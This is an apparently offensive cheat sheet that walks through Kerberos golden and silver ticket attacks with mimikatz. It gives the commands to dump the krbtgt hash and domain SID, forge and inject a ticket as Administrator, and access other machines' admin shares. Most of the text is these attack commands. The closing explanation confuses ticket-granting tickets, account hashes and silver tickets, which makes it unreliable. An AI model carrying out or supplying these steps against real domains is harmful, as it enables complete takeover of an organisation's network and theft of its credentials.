What is golden-ticket-attack:
  When we compromise the krbtgt account, we own the domain
  We can request access to any resource or system on the domain
  Golden tickets == complete access to every machine

##################### Golden/Silver Ticket Attack #####################
Dump the krbtgt hash:
  cd downloads && mimikatz.exe 
                 Navigate to the directory mimikatz is in and run mimikatz
  privilege::debug
                 Ensure this outputs [privilege '20' ok]
  lsadump::lsa /inject /name:krbtgt
                 Dump the hash as well as the security identifier needed to create
                 a Golden Ticket. To create a silver ticket you need to change the
                 /name: to dump the hash of either a domain admin account or a
                 service account such as the SQLService account.

Create a Golden/Silver Ticket:
  Kerberos::golden /user:Administrator /domain:<DOMAIN>.local /sid:<SID> /krbtgt:<NTLM_HASH> /id:500 /ptt
                 Create a golden ticket to create a silver ticket simply put a service
                 NTLM hash into the krbtgt slot, the sid of the service account into
                 sid, and change the id to 1103.

Use the Golden/Silver Ticket to access other machines:
  misc::cmd      Open a new elevated command prompt with the given ticket in mimikatz
  dir \\DESKTOP-1\c$
                 Access machines that you want

Informational:
  A golden ticket attack works by dumping the ticket-granting ticket of any user on
  the domain this would preferably be a domain admin however for a golden ticket
  you would dump the krbtgt ticket and for a silver ticket, you would dump any
  service or domain admin ticket. You then use these details inside of a mimikatz 
  golden ticket attack in order to create a TGT that impersonates the given service
  account information
  What you can access after creating a ticket will depend on the privileges
  of the user that you decided to take the ticket from however if you took the ticket
  from krbtgt you have access to the ENTIRE network hence the name golden ticket;
  however, silver tickets only have access to those that the user has access to if
  it is a domain admin it can almost access the entire network however it is slightly 
  less elevated from a golden ticket.
